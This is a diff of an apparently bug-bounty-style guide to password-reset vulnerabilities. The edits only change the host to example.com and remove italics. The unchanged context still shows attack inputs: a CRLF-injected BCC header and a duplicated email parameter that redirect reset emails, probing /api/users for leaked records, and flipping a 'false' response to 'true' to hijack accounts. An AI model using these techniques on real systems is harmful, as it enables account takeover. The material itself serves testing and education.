@@ -27,7 +27,7 @@ In the interception of a password recovery request or email, if the request meth
 
 ```http
 GET /password-reset
-Host: $WEBSITE
+Host: example.com
 SetCookie: $COOKIE
 
 email=user@mail.com%0A%0Dbcc:my@mail.com
@@ -39,7 +39,7 @@ If the request method was sent as GET, then add your email address next to the t
 
 ```http
 GET /password-reset?email=user@mail.com&email=my@mail.com
-Host: $WEBSITE
+Host: example.com
 SetCookie: 
 ```
 {% endstep %}
@@ -101,7 +101,7 @@ The next important step is to enter the forgotten password section and change th
 {% endstep %}
 
 {% step %}
-Change the forgotten password path to `/api/users,`_If it shows the records and user information in the response, you have found the vulnerability_
+Change the forgotten password path to `/api/users,`If it shows the records and user information in the response, you have found the vulnerability
 {% endstep %}
 {% endstepper %}
 
@@ -135,7 +135,7 @@ Now right-click on the request section and click on the "Response to this reques
 {% endstep %}
 
 {% step %}
-If the response is in JSON format and the response body contains 'false,' manipulate it and convert it to 'true' _If you enter the next stage, change the password and log in to the user account with the new information, and you will find the vulnerability_
+If the response is in JSON format and the response body contains 'false,' manipulate it and convert it to 'true' If you enter the next stage, change the password and log in to the user account with the new information, and you will find the vulnerability
 {% endstep %}
 {% endstepper %}
 
